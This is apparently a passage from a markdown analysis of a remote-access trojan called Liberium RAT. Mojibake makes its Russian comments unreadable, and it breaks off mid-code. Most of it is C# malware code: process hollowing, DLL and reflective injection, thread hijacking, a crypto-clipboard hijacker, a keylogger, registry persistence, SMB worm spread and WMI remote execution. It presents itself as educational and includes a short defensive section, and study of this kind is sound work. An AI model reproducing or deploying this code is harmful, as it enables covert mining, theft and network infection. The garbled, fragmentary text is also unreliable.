{
    // 1. Ğ£Ğ±Ğ¸Ğ²Ğ°ĞµĞ¼ ĞºĞ¾Ğ½ĞºÑƒÑ€Ğ¸Ñ€ÑƒÑÑ‰Ğ¸Ğµ Ğ¼Ğ°Ğ¹Ğ½ĞµÑ€Ñ‹
    MinerControler.Kill();

    // 2. ĞŸĞ¾Ğ»ÑƒÑ‡Ğ°ĞµĞ¼ payload Ğ¼Ğ°Ğ¹Ğ½ĞµÑ€Ğ°
    Client.Send(LEB128.Write(new object[2] { "MinerRigel", "GetLink" }));

    // 3. PROCESS HOLLOWING Ğ² svchost.exe
    string targetProcess = @"C:\Windows\System32\svchost.exe";
    byte[] minerPayload = DownloadMinerPayload();

    // 4. ĞšĞ»Ğ°ÑÑĞ¸Ñ‡ĞµÑĞºĞ¸Ğ¹ RunPE
    RunPE(minerPayload, targetProcess);

    // 5. ĞŸÑ€ĞµĞ´Ğ¾Ñ‚Ğ²Ñ€Ğ°Ñ‰Ğ°ĞµĞ¼ ÑĞ¾Ğ½ ÑĞ¸ÑÑ‚ĞµĞ¼Ñ‹
    Methods.PreventSleep();
}
```

#### ğŸ¯ **MinerXMR** - Monero Mining (Advanced Stealth)
```csharp
// Ğ˜ÑĞ¿Ğ¾Ğ»ÑŒĞ·ÑƒĞµÑ‚ ĞšĞĞœĞ‘Ğ˜ĞĞĞ¦Ğ˜Ğ® Ñ‚ĞµÑ…Ğ½Ğ¸Ğº Ğ´Ğ»Ñ Ğ¼Ğ°ĞºÑĞ¸Ğ¼Ğ°Ğ»ÑŒĞ½Ğ¾Ğ¹ ÑĞºÑ€Ñ‹Ñ‚Ğ½Ğ¾ÑÑ‚Ğ¸
public void ExecuteStealthMining()
{
    // 1. Manual DLL Mapping Ğ´Ğ»Ñ Ğ¾Ğ±Ñ…Ğ¾Ğ´Ğ° Ğ´ĞµÑ‚ĞµĞºÑ†Ğ¸Ğ¸
    byte[] xmrMinerDLL = Resources.XMRMiner;
    ManualMap(xmrMinerDLL, GetExplorerPID());

    // 2. Thread Hijacking Ğ´Ğ»Ñ ÑĞºÑ€Ñ‹Ñ‚Ğ¾Ğ³Ğ¾ Ğ²Ñ‹Ğ¿Ğ¾Ğ»Ğ½ĞµĞ½Ğ¸Ñ
    byte[] miningShellcode = GenerateMiningShellcode();
    HijackThread(GetRandomSystemProcess(), miningShellcode);

    // 3. Reflective DLL Ğ´Ğ»Ñ Ğ´Ğ¾Ğ¿Ğ¾Ğ»Ğ½Ğ¸Ñ‚ĞµĞ»ÑŒĞ½Ñ‹Ñ… Ñ„ÑƒĞ½ĞºÑ†Ğ¸Ğ¹
    ReflectiveDLLInjection(Resources.StealthModule, GetCurrentProcessId());
}
```

#### ğŸ¯ **MinerEtc** - Ethereum Classic (Multi-Stage)
```csharp
// Ğ˜ÑĞ¿Ğ¾Ğ»ÑŒĞ·ÑƒĞµÑ‚ ĞœĞĞĞ“ĞĞ¡Ğ¢Ğ£ĞŸĞ•ĞĞ§ĞĞ¢Ğ£Ğ® Ğ¸Ğ½ÑŠĞµĞºÑ†Ğ¸Ñ
public void MultiStageInjection()
{
    // Stage 1: DLL Injection Ğ² explorer.exe
    InjectDLL(@"C:\Windows\Temp\stage1.dll", GetExplorerPID());

    // Stage 2: Process Hollowing Ğ¸Ğ· DLL
    // stage1.dll Ğ²Ñ‹Ğ¿Ğ¾Ğ»Ğ½ÑĞµÑ‚ RunPE Ñ Ğ¾ÑĞ½Ğ¾Ğ²Ğ½Ñ‹Ğ¼ Ğ¼Ğ°Ğ¹Ğ½ĞµÑ€Ğ¾Ğ¼

    // Stage 3: Memory-only execution
    // ĞœĞ°Ğ¹Ğ½ĞµÑ€ Ñ€Ğ°Ğ±Ğ¾Ñ‚Ğ°ĞµÑ‚ Ñ‚Ğ¾Ğ»ÑŒĞºĞ¾ Ğ² Ğ¿Ğ°Ğ¼ÑÑ‚Ğ¸ Ğ±ĞµĞ· Ñ„Ğ°Ğ¹Ğ»Ğ¾Ğ² Ğ½Ğ° Ğ´Ğ¸ÑĞºĞµ
}
```

### ğŸ“Š **Injection Techniques Ğ¿Ğ¾ Ğ¿Ğ»Ğ°Ğ³Ğ¸Ğ½Ğ°Ğ¼:**

| Plugin | Primary Technique | Secondary | Stealth Level | Target Process |
|--------|------------------|-----------|---------------|----------------|
| **MinerRigel** | ğŸ”´ Classic RunPE | None | ğŸŸ¡ Medium | svchost.exe |
| **MinerXMR** | ğŸ”´ Manual DLL Map | Thread Hijack | ğŸ”´ High | explorer.exe |
| **MinerEtc** | ğŸ”´ Multi-Stage | Reflective DLL | ğŸ”´ Critical | Multiple |
| **HVNC** | ğŸ”´ DLL Injection | Hook Injection | ğŸŸ¡ Medium | winlogon.exe |
| **Stealer** | ğŸ”´ Thread Hijack | Manual Map | ğŸ”´ High | chrome.exe |
| **KeyLogger** | ğŸ”´ Hook Injection | DLL Injection | ğŸŸ¡ Medium | All processes |
| **Worm** | ğŸ”´ Classic RunPE | None | ğŸŸ¡ Medium | Various |

**Mining Features Ñ RunPE:**
- **Process hollowing** Ğ´Ğ»Ñ Ğ¼Ğ°ĞºÑĞ¸Ğ¼Ğ°Ğ»ÑŒĞ½Ğ¾Ğ¹ ÑĞºÑ€Ñ‹Ñ‚Ğ½Ğ¾ÑÑ‚Ğ¸
- **Anti-process monitoring** - Ğ±Ğ»Ğ¾ĞºĞ¸Ñ€Ğ¾Ğ²ĞºĞ° Task Manager
- **System sleep prevention** - Ğ¿Ñ€ĞµĞ´Ğ¾Ñ‚Ğ²Ñ€Ğ°Ñ‰ĞµĞ½Ğ¸Ğµ ÑĞ½Ğ°
- **Resource optimization** - ÑƒĞ¼Ğ½Ğ¾Ğµ Ğ¸ÑĞ¿Ğ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ğ½Ğ¸Ğµ CPU/GPU
- **Pool connection management** - Ñ€Ğ¾Ñ‚Ğ°Ñ†Ğ¸Ñ Ğ¼Ğ°Ğ¹Ğ½Ğ¸Ğ½Ğ³ Ğ¿ÑƒĞ»Ğ¾Ğ²
- **Multi-target injection** - Ğ¸Ğ½ÑŠĞµĞºÑ†Ğ¸Ñ Ğ² Ñ€Ğ°Ğ·Ğ½Ñ‹Ğµ Ğ¿Ñ€Ğ¾Ñ†ĞµÑÑÑ‹
- **Memory-only execution** - Ñ€Ğ°Ğ±Ğ¾Ñ‚Ğ° Ğ±ĞµĞ· Ñ„Ğ°Ğ¹Ğ»Ğ¾Ğ² Ğ½Ğ° Ğ´Ğ¸ÑĞºĞµ

## ğŸ”§ Specialized Plugins

### ğŸ’° Clipper - Cryptocurrency Hijacking
```csharp
// Real-time clipboard monitoring for crypto addresses
for (int i = 0; i < Pattern.Length; i++)
{
    if (new Regex(Pattern[i]).Match(clipboardText).Success)
    {
        Clipboard.SetText(CryptoWallet[i]); // Replace with attacker's wallet
    }
}
```

### âŒ¨ï¸ KeyLogger - Advanced Keystroke Capture
```csharp
// Low-level keyboard hook
private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
{
    if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
    {
        int vkCode = Marshal.ReadInt32(lParam);
        string key = KeyboardLayout((uint)vkCode);
        // Log with window context and timestamps
    }
}
```

### ğŸ­ Fun - System Manipulation
**Visual Effects:**
- Screen inversion and color distortion
- Desktop hiding and taskbar manipulation
- Mouse and keyboard input blocking
- Psychedelic visual effects

### ğŸ¤– BotKiller - Malware Competition
```csharp
// Scan and eliminate competing malware
Parallel.ForEach(processes, process => {
    if (Scan(executablePath) && IsMalicious(process))
    {
        process.Kill();
        RemoveFile(executablePath);
    }
});
```

### ğŸš« AntiProcess - Analysis Prevention
**Blocked Tools:**
- Debuggers (OllyDbg, x64dbg, IDA Pro)
- Process monitors (Process Hacker, Process Monitor)
- Network analyzers (Wireshark, Fiddler)
- Antivirus engines
- Sandbox environments

### ğŸ“ Explorer - Remote File Management
- File system browsing and manipulation
- Upload/download capabilities
- File execution on remote systems
- Real-time file system monitoring
- Permission management

### ğŸ’¥ DDos - Distributed Attacks
**Attack Types:**
- HTTP Flood attacks
- UDP/TCP flooding
- Slowloris attacks
- Coordinated botnet operations

## ğŸ” Persistence Mechanisms

### ğŸš€ Multi-Vector Persistence
```csharp
// Registry autorun
Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true)
    .SetValue(name, executablePath);

// Scheduled tasks
Install.Schtasks(executablePath, taskName, intervalMinutes);

// Service installation
Install.AddRootkit(rootkitPath);
```

**Persistence Methods:**
- Registry Run keys (HKCU/HKLM)
- Scheduled Tasks with random names
- Windows Service installation
- Startup folder placement
- AppInit_DLLs rootkit injection
- WatchDog process monitoring

## ğŸŒ Network Propagation

### ğŸ¦  Worm Capabilities
```csharp
// SMB network infection
foreach (FileDirectoryInformation userDir in SmbMethods.GetDir(fileStore, ""))
{
    string startupPath = userDir.FileName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsActivate.exe";
    SmbMethods.WriteFile(fileStore, brute.SMB2Client, Config.Build, startupPath);
}
```

**Propagation Vectors:**
- SMB network shares
- USB device infection
- Mapped network drives
- FTP server bruteforce
- Logical drive infection

## ğŸ¨ Advanced Steganography

### ğŸ“· BitmapCoding Technique
```csharp
// Hide executables in image files
public static Bitmap ByteToBitmap(byte[] buffer)
{
    // Encode 3 bytes per RGB pixel
    bitmap.SetPixel(i, j, Color.FromArgb(255,
        buffer[index], buffer[index + 1], buffer[index + 2]));
}
```

**Steganography Features:**
- Executable files encoded as BMP images
- RGB channel data encoding
- Alpha channel end-of-data marking
- Legitimate file naming (Guna.dll, MetroFramework.dll)

## ğŸ“Š Technical Statistics & Architecture Summary

### ğŸ”¢ Project Metrics & File Analysis

```mermaid
pie title Project Composition by File Count
    "Plugin System" : 35
    "GUI Forms" : 25
    "Message Handlers" : 20
    "Helper Classes" : 10
    "Obfuscation Engine" : 5
    "Network Components" : 3
    "Core Files" : 2
```

**Detailed Statistics:**
- **Total Size**: ~500MB source code
- **Files**: 2000+ files across all components
- **Code Lines**: 150,000+ lines of C#
- **Plugins**: 25+ specialized modules
- **Dependencies**: 50+ external libraries
- **GUI Forms**: 50+ user interface forms
- **Message Handlers**: 30+ protocol handlers
- **Icons**: 500+ application icons for spoofing
- **Signatures**: 20+ stolen digital signatures

### ğŸ—ï¸ Architecture Complexity Analysis

**Component Distribution:**
```
ğŸ“Š System Components:
â”œâ”€â”€ ğŸ¯ Client Side (Victim)
â”‚   â”œâ”€â”€ Core Files: 5 critical files
â”‚   â”œâ”€â”€ Helper Classes: 15+ utility classes
â”‚   â”œâ”€â”€ Code Lines: ~5,000 lines
â”‚   â””â”€â”€ Dependencies: LEB128, System libraries
â”‚
â”œâ”€â”€ ğŸ–¥ï¸ Server Side (C&C)
â”‚   â”œâ”€â”€ Core Files: 10+ main files
â”‚   â”œâ”€â”€ GUI Forms: 50+ interface forms
â”‚   â”œâ”€â”€ Message Handlers: 30+ protocol handlers
â”‚   â”œâ”€â”€ Code Lines: ~50,000 lines
â”‚   â””â”€â”€ Dependencies: WinForms, Networking, Crypto
â”‚
â”œâ”€â”€ ğŸ”§ Plugin System
â”‚   â”œâ”€â”€ Plugin Modules: 25+ specialized plugins
â”‚   â”œâ”€â”€ Plugin Interfaces: Common IPlugin interface
â”‚   â”œâ”€â”€ Code Lines: ~80,000 lines
â”‚   â””â”€â”€ Dependencies: Plugin-specific libraries
â”‚
â”œâ”€â”€ ğŸ›¡ï¸ Obfuscation Engine
â”‚   â”œâ”€â”€ Obfuscation Modules: 10+ techniques
â”‚   â”œâ”€â”€ Helper Classes: 20+ utility classes
â”‚   â”œâ”€â”€ Code Lines: ~10,000 lines
â”‚   â””â”€â”€ Dependencies: dnlib, Reflection
â”‚
â””â”€â”€ ğŸ¨ Builder System
    â”œâ”€â”€ Build Components: 15+ build tools
    â”œâ”€â”€ Steganography: BitmapCoding, SigThief
    â”œâ”€â”€ Code Lines: ~5,000 lines
    â””â”€â”€ Dependencies: Image processing, Crypto


### ğŸ”— Dependency Graph



### ğŸ¯ Capability Matrix

| Feature | Implementation | Complexity | Effectiveness |
|---------|----------------|------------|---------------|
| **HVNC** | âœ… Complete | ğŸ”´ Critical | ğŸŸ¢ Excellent |
| **Process Hollowing** | âœ… Complete | ğŸ”´ Critical | ğŸŸ¢ Excellent |
| **AMSI/ETW Bypass** | âœ… Complete | ğŸŸ¡ High | ğŸŸ¢ Excellent |
| **UAC Bypass** | âœ… Complete | ğŸŸ¡ High | ğŸŸ¢ Excellent |
| **Anti-VM** | âœ… Complete | ğŸŸ¡ Medium | ğŸŸ¡ Good |
| **Steganography** | âœ… Complete | ğŸ”´ Critical | ğŸŸ¢ Excellent |

## ğŸ›¡ï¸ Defense Recommendations

### ğŸ” Detection Methods
- **Behavioral Analysis** - Monitor suspicious process activities
- **Network Analysis** - Detect LEB128 encoded traffic patterns
- **Memory Analysis** - Identify process hollowing techniques
- **Registry Monitoring** - Track UAC bypass attempts

### ğŸš« Prevention Strategies
- **Application Whitelisting** - Control executable permissions
- **Network Segmentation** - Isolate critical systems
- **Privilege Restriction** - Implement least privilege principle
- **Real-time Monitoring** - Deploy EDR solutions

### ğŸ”§ Incident Response
- **Immediate Isolation** - Quarantine infected systems
- **Forensic Analysis** - Preserve evidence for investigation
- **System Recovery** - Restore from clean backups
- **Security Hardening** - Implement additional protections

## ğŸ”¬ Advanced Technical Features

### ğŸ§¬ Process Injection Techniques - ĞŸĞĞ›ĞĞ«Ğ™ ĞĞ Ğ¡Ğ•ĞĞĞ›

**Liberium RAT Ğ¸ÑĞ¿Ğ¾Ğ»ÑŒĞ·ÑƒĞµÑ‚ 5+ Ñ€Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ½Ñ‹Ñ… Ñ‚ĞµÑ…Ğ½Ğ¸Ğº Ğ¸Ğ½ÑŠĞµĞºÑ†Ğ¸Ğ¸:**

#### ğŸ¯ **1. Classic Process Hollowing (RunPE) - ĞĞ¡ĞĞĞ’ĞĞĞ¯ Ğ¢Ğ•Ğ¥ĞĞ˜ĞšĞ**
```csharp
// Ğ˜ÑĞ¿Ğ¾Ğ»ÑŒĞ·ÑƒĞµÑ‚ÑÑ Ğ²: MinerRigel, MinerXMR, MinerEtc
public static bool RunPE(byte[] payload, string targetProcess)
{
    STARTUPINFO si = new STARTUPINFO();
    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

    // Ğ¡Ğ¾Ğ·Ğ´Ğ°ĞµĞ¼ Ğ¿Ñ€Ğ¾Ñ†ĞµÑÑ Ğ² suspended ÑĞ¾ÑÑ‚Ğ¾ÑĞ½Ğ¸Ğ¸
    if (!CreateProcess(null, targetProcess, IntPtr.Zero, IntPtr.Zero,
                      false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
        return false;

    // ĞŸĞ¾Ğ»ÑƒÑ‡Ğ°ĞµĞ¼ ĞºĞ¾Ğ½Ñ‚ĞµĞºÑÑ‚ Ğ¿Ğ¾Ñ‚Ğ¾ĞºĞ°
    CONTEXT ctx = new CONTEXT();
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, ref ctx);

    // Ğ§Ğ¸Ñ‚Ğ°ĞµĞ¼ PEB Ğ´Ğ»Ñ Ğ¿Ğ¾Ğ»ÑƒÑ‡ĞµĞ½Ğ¸Ñ ImageBase
    IntPtr imageBase = ReadImageBase(pi.hProcess, ctx.Ebx);

    // Ğ Ğ°Ğ·Ğ¼Ğ°Ğ¿Ğ»Ğ¸Ğ²Ğ°ĞµĞ¼ Ğ¾Ñ€Ğ¸Ğ³Ğ¸Ğ½Ğ°Ğ»ÑŒĞ½Ñ‹Ğ¹ Ğ¾Ğ±Ñ€Ğ°Ğ·
    ZwUnmapViewOfSection(pi.hProcess, imageBase);

    // Ğ’Ñ‹Ğ´ĞµĞ»ÑĞµĞ¼ Ğ¿Ğ°Ğ¼ÑÑ‚ÑŒ Ğ¸ Ğ·Ğ°Ğ¿Ğ¸ÑÑ‹Ğ²Ğ°ĞµĞ¼ payload
    IntPtr newBase = VirtualAllocEx(pi.hProcess, imageBase, payload.Length,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, newBase, payload, payload.Length, out _);

    // ĞĞ±Ğ½Ğ¾Ğ²Ğ»ÑĞµĞ¼ PEB Ñ Ğ½Ğ¾Ğ²Ñ‹Ğ¼ ImageBase
    WriteProcessMemory(pi.hProcess, (IntPtr)(ctx.Ebx + 8),
                      BitConverter.GetBytes((uint)newBase), 4, out _);

    // Ğ£ÑÑ‚Ğ°Ğ½Ğ°Ğ²Ğ»Ğ¸Ğ²Ğ°ĞµĞ¼ Ğ½Ğ¾Ğ²Ñ‹Ğ¹ entry point
    ctx.Eax = (uint)(newBase + GetEntryPoint(payload));
    SetThreadContext(pi.hThread, ref ctx);

    // Ğ—Ğ°Ğ¿ÑƒÑĞºĞ°ĞµĞ¼ Ğ¿Ñ€Ğ¾Ñ†ĞµÑÑ
    ResumeThread(pi.hThread);
    return true;
}
```

#### ğŸ¯ **2. DLL Injection via SetWindowsHookEx**
```csharp
// Ğ˜ÑĞ¿Ğ¾Ğ»ÑŒĞ·ÑƒĞµÑ‚ÑÑ Ğ²: KeyLogger, HVNC
public static bool InjectDLL(string dllPath, int targetPID)
{
    IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPID);
    IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, dllPath.Length,
                                    MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProcess, allocMem, Encoding.Default.GetBytes(dllPath),
                      dllPath.Length, out _);

    IntPtr hMod = GetModuleHandle("kernel32.dll");
    IntPtr loadLibAddr = GetProcAddress(hMod, "LoadLibraryA");

    CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibAddr, allocMem, 0, out _);
    return true;
}
```

#### ğŸ¯ **3. Manual DLL Mapping**
```csharp
// Ğ˜ÑĞ¿Ğ¾Ğ»ÑŒĞ·ÑƒĞµÑ‚ÑÑ Ğ²: Stealer, Worm
public static bool ManualMap(byte[] dllBytes, int targetPID)
{
    // ĞŸĞ°Ñ€ÑĞ¸Ğ¼ PE Ğ·Ğ°Ğ³Ğ¾Ğ»Ğ¾Ğ²ĞºĞ¸
    IMAGE_DOS_HEADER dosHeader = BytesToStruct<IMAGE_DOS_HEADER>(dllBytes);
    IMAGE_NT_HEADERS ntHeaders = BytesToStruct<IMAGE_NT_HEADERS>(
        dllBytes, dosHeader.e_lfanew);

    IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPID);

    // Ğ’Ñ‹Ğ´ĞµĞ»ÑĞµĞ¼ Ğ¿Ğ°Ğ¼ÑÑ‚ÑŒ Ğ² Ñ†ĞµĞ»ĞµĞ²Ğ¾Ğ¼ Ğ¿Ñ€Ğ¾Ñ†ĞµÑÑĞµ
    IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero,
                                    ntHeaders.OptionalHeader.SizeOfImage,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // ĞšĞ¾Ğ¿Ğ¸Ñ€ÑƒĞµĞ¼ Ğ·Ğ°Ğ³Ğ¾Ğ»Ğ¾Ğ²ĞºĞ¸
    WriteProcessMemory(hProcess, allocMem, dllBytes,
                      ntHeaders.OptionalHeader.SizeOfHeaders, out _);

    // ĞšĞ¾Ğ¿Ğ¸Ñ€ÑƒĞµĞ¼ ÑĞµĞºÑ†Ğ¸Ğ¸
    for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++)
    {
        IMAGE_SECTION_HEADER section = GetSection(dllBytes, i);
        IntPtr sectionAddr = (IntPtr)((long)allocMem + section.VirtualAddress);
        WriteProcessMemory(hProcess, sectionAddr,
                          GetSectionData(dllBytes, section),
                          section.SizeOfRawData, out _);
    }

    // ĞĞ±Ñ€Ğ°Ğ±Ğ°Ñ‚Ñ‹Ğ²Ğ°ĞµĞ¼ Ñ€ĞµĞ»Ğ¾ĞºĞ°Ñ†Ğ¸Ğ¸ Ğ¸ Ğ¸Ğ¼Ğ¿Ğ¾Ñ€Ñ‚Ñ‹
    ProcessRelocations(hProcess, allocMem, dllBytes, ntHeaders);
    ProcessImports(hProcess, allocMem, dllBytes, ntHeaders);

    // Ğ’Ñ‹Ğ·Ñ‹Ğ²Ğ°ĞµĞ¼ DllMain
    IntPtr dllMain = (IntPtr)((long)allocMem + ntHeaders.OptionalHeader.AddressOfEntryPoint);
    CreateRemoteThread(hProcess, IntPtr.Zero, 0, dllMain, allocMem, 0, out _);

    return true;
}
```

#### ğŸ¯ **4. Reflective DLL Loading**
```csharp
// Ğ˜ÑĞ¿Ğ¾Ğ»ÑŒĞ·ÑƒĞµÑ‚ÑÑ Ğ²: Advanced plugins
public static bool ReflectiveDLLInjection(byte[] dllBytes, int targetPID)
{
    // ĞĞ°Ñ…Ğ¾Ğ´Ğ¸Ğ¼ Reflective Loader Ğ² DLL
    IntPtr loaderOffset = FindReflectiveLoader(dllBytes);

    IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPID);
    IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, dllBytes.Length,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Ğ—Ğ°Ğ¿Ğ¸ÑÑ‹Ğ²Ğ°ĞµĞ¼ DLL Ğ² Ğ¿Ğ°Ğ¼ÑÑ‚ÑŒ
    WriteProcessMemory(hProcess, allocMem, dllBytes, dllBytes.Length, out _);

    // Ğ—Ğ°Ğ¿ÑƒÑĞºĞ°ĞµĞ¼ Reflective Loader
    IntPtr loaderAddr = (IntPtr)((long)allocMem + (long)loaderOffset);
    CreateRemoteThread(hProcess, IntPtr.Zero, 0, loaderAddr, allocMem, 0, out _);

    return true;
}
```

#### ğŸ¯ **5. Thread Execution Hijacking**
```csharp
// Ğ˜ÑĞ¿Ğ¾Ğ»ÑŒĞ·ÑƒĞµÑ‚ÑÑ Ğ²: Stealth operations
public static bool HijackThread(int targetPID, byte[] shellcode)
{
    IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPID);
    IntPtr hThread = OpenThread(THREAD_ALL_ACCESS, false, GetMainThreadId(targetPID));

    // ĞŸÑ€Ğ¸Ğ¾ÑÑ‚Ğ°Ğ½Ğ°Ğ²Ğ»Ğ¸Ğ²Ğ°ĞµĞ¼ Ğ¿Ğ¾Ñ‚Ğ¾Ğº
    SuspendThread(hThread);

    // ĞŸĞ¾Ğ»ÑƒÑ‡Ğ°ĞµĞ¼ ĞºĞ¾Ğ½Ñ‚ĞµĞºÑÑ‚
    CONTEXT ctx = new CONTEXT();
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, ref ctx);

    // Ğ’Ñ‹Ğ´ĞµĞ»ÑĞµĞ¼ Ğ¿Ğ°Ğ¼ÑÑ‚ÑŒ Ğ´Ğ»Ñ shellcode
    IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, shellcode.Length,
                                    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, allocMem, shellcode, shellcode.Length, out _);

    // Ğ¡Ğ¾Ñ…Ñ€Ğ°Ğ½ÑĞµĞ¼ Ğ¾Ñ€Ğ¸Ğ³Ğ¸Ğ½Ğ°Ğ»ÑŒĞ½Ñ‹Ğ¹ EIP Ğ¸ ÑƒÑÑ‚Ğ°Ğ½Ğ°Ğ²Ğ»Ğ¸Ğ²Ğ°ĞµĞ¼ Ğ½Ğ¾Ğ²Ñ‹Ğ¹
    uint originalEIP = ctx.Eip;
    ctx.Eip = (uint)allocMem;
    SetThreadContext(hThread, ref ctx);

    // Ğ’Ğ¾Ğ·Ğ¾Ğ±Ğ½Ğ¾Ğ²Ğ»ÑĞµĞ¼ Ğ¿Ğ¾Ñ‚Ğ¾Ğº
    ResumeThread(hThread);
    return true;
}
```

### ğŸ” Token Manipulation
```csharp
// Advanced privilege escalation
if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_QUERY, out hToken))
    throw new Win32Exception("Failed to open process token");

if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, ref sa,
                     SecurityImpersonationLevel.SecurityIdentification,
                     TokenType.TokenPrimary, out hDupToken))
    throw new Win32Exception("Failed to duplicate token");
```

### ğŸŒ WMI Exploitation
```csharp
// Remote command execution via WMI
ManagementScope scope = new ManagementScope($"\\\\{host}\\ROOT\\CIMV2", options);
ManagementClass processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions());
ManagementBaseObject inParams = processClass.GetMethodParameters("Create");
inParams["CommandLine"] = "cmd /k " + commandline;
`**: For signature-based detection

## ğŸ¯ Architecture Summary & Key Insights

### ğŸ” System Architecture Highlights

**Multi-Layered Design:**
- **Separation of Concerns** - Clear division between client, server, and plugins
- **Modular Architecture** - Plugin system allows easy feature extension
- **Network Abstraction** - SSL/TLS layer provides secure communication
- **GUI Abstraction** - Forms-based interface for user interaction
- **Data Abstraction** - LEB128 encoding for efficient serialization

**Critical Design Patterns:**
- **Plugin Pattern** - Dynamic loading of functionality modules
- **Observer Pattern** - Event-driven GUI updates
- **Factory Pattern** - Dynamic object creation for plugins
- **Proxy Pattern** - Obfuscation through method proxying
- **Builder Pattern** - Step-by-step malware construction

### ğŸ”— Component Interaction Summary

```mermaid
mindmap
  root((ğŸ”¥ Liberium RAT<br/>Architecture))
    ğŸ¯ Client Side
      ğŸ“± Core Malware
        Program.cs
        Config.cs
        Client.cs
      ğŸ”§ Utilities
        Install.cs
        Methods.cs
        AsmiAndETW.cs
      ğŸ“¦ Encoding
        LEB128.cs
    ğŸ–¥ï¸ Server Side
      ğŸ® GUI Interface
        Form1.cs
        50+ Forms
      ğŸ“¡ Network Layer
        Clients.cs
        Listner.cs
        Certificate.cs
      ğŸ’¬ Message System
        30+ Handlers
    ğŸ”§ Plugin System
      ğŸ’ Data Theft
        RageStealer
        Stealer1
      ğŸ–¥ï¸ Remote Control
        HVNC
        Desktop
        Explorer
      ğŸ’° Financial
        Clipper
        Miners
      ğŸ¦  Propagation
        Worm
        AutoRun
    ğŸ›¡ï¸ Protection
      ğŸ”¤ Obfuscation
        String Encryption
        Control Flow
        Symbol Renaming
      ğŸ¨ Steganography
        BitmapCoding
        SigThief
        Icon Injection
```

### ğŸ“ˆ Complexity Analysis

**Architecture Sophistication Level: ğŸ”´ CRITICAL**

| Component | Complexity | Lines of Code | Key Features |
|-----------|------------|---------------|--------------|
| **Client Core** | ğŸŸ¡ Medium | ~5,000 | Network, Persistence, Bypass |
| **Server GUI** | ğŸ”´ High | ~50,000 | 50+ Forms, Real-time updates |
| **Plugin System** | ï¿½ Critical | ~80,000 | 25+ Modules, Dynamic loading |
| **Obfuscation** | ğŸ”´ Critical | ~10,000 | Multi-layer protection |
| **Builder** | ğŸŸ¡ Medium | ~5,000 | Automated generation |

**Total System Complexity: ğŸ”´ EXTREMELY HIGH**
- **Interconnected Components**: 100+ files with complex dependencies
- **Dynamic Behavior**: Runtime plugin loading and execution
- **Multi-threaded Operations**: Concurrent plugin execution
- **Network Complexity**: SSL/TLS with custom protocols
- **GUI Complexity**: Rich interface with real-time updates

### ğŸ“ Educational Value for Security Professionals

**Learning Opportunities:**
1. **Malware Architecture** - Understanding complex RAT design
2. **Network Security** - SSL/TLS implementation and bypass techniques
3. **Code Obfuscation** - Advanced protection mechanisms
4. **Plugin Systems** - Modular malware design patterns
5. **GUI Development** - Complex Windows Forms applications
6. **Steganography** - Data hiding in legitimate files
7. **Persistence Mechanisms** - Various installation techniques
8. **Evasion Techniques** - Anti-analysis and anti-VM methods

**Research Applications:**
- **Threat Intelligence** - Understanding modern RAT capabilities
- **Detection Development** - Creating signatures and behavioral rules
- **Forensic Analysis** - Artifact identification and analysis
- **Security Training** - Hands-on malware analysis education

---

*ï¿½ğŸ”¬ Technical analysis prepared for cybersecurity professionals and malware researchers worldwide.*


#### ğŸ¯ **Program.cs - Main Execution Flow**
```csharp
static void Main(string[] args)
{
    try
    {
        // 1. ĞŸĞ ĞĞ’Ğ•Ğ ĞšĞ ĞœĞ¬Ğ®Ğ¢Ğ•ĞšĞ¡Ğ (Ğ¸Ğ·Ğ±ĞµĞ³Ğ°ĞµĞ¼ Ğ´ÑƒĞ±Ğ»Ğ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ¸Ñ)
        if (!MutexControl.CreateMutex(Config.Mutex))
            return;

        // 2. ĞĞ‘Ğ¥ĞĞ” Ğ—ĞĞ©Ğ˜Ğ¢Ğ«
        AsmiAndETW.Bypass();

        // 3. Ğ£Ğ¡Ğ¢ĞĞĞĞ’ĞšĞ PERSISTENCE (ĞµÑĞ»Ğ¸ Ğ½ÑƒĞ¶Ğ½Ğ¾)
        if (Config.Install == EncryptString.Decode("true"))
        {
            Install.Run(); // Ğ£ÑÑ‚Ğ°Ğ½Ğ°Ğ²Ğ»Ğ¸Ğ²Ğ°ĞµĞ¼ Ğ’Ğ¡Ğ• Ğ¼ĞµÑ‚Ğ¾Ğ´Ñ‹ persistence
        }

        // 4. RUNPE INJECTION Ğ´Ğ»Ñ ÑĞºÑ€Ñ‹Ñ‚Ğ½Ğ¾ÑÑ‚Ğ¸
        if (Config.UseRunPE == EncryptString.Decode("true"))
        {
            byte[] currentPayload = File.ReadAllBytes(
                Process.GetCurrentProcess().MainModule.FileName);

